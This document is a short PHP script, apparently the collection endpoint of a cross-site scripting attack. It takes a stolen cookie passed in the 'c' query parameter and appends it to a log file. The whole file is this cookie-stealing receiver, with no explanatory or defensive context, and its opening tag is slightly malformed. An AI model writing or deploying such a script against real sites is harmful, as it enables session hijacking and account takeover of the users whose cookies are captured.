<?php>
  $cookie = $_GET["c"];
  $file = fopen('log.txt','a');
  fwrite($file,$cookie . "\n\n");
?>
